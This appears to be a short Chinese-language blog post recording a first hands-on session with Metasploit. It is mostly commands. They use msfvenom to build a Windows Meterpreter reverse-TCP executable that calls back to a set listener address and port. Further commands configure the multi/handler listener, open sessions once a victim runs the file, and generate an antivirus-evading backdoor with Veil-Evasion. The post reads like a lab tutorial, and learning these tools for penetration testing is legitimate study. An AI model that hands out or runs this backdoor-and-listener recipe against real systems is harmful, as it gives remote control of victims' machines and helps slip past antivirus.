---
title: metasploit 初体验
date: 2017-2-6 18:09
tags: metasploit
---
# msf简单使用：(以windows/meterpreter/reverse_tcp为例)

## 1.payload设置：

新开终端
`msfvenom -l`
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f exe -o /root/桌面/1.exe //生成exe文件`

## 2.监听：

进入metasploit
`use exploit/multi/handler`
`show options`

## 3.插入攻击荷载

show payloads
`set payload windows/meterpreter_reverse_tcp`
再次show options(出现LHOST和LPORT选项)
`set lhost 192.168.1.120`
`set lport 4444`

## 4.使用run 或者 exploit 启动攻击

等待被攻击主机中招，即可拿到session
使用jobs停止攻击
`sessions -l  //获取session列表`
`sessions -i 1 //进入meterpreter`

==============================
# PS:

## 使用veil-veasion生成后门：
打开终端
`veil-veasion`
`list`
`use 6 //以c为例`

生成的后台地址：
`/var/lib/veil-evasion/output/compiled/payload.exe`

在msf中使用：
`msfconsole -r /var/lib/veil-evasion/output/handlers/payload_handler.rc`
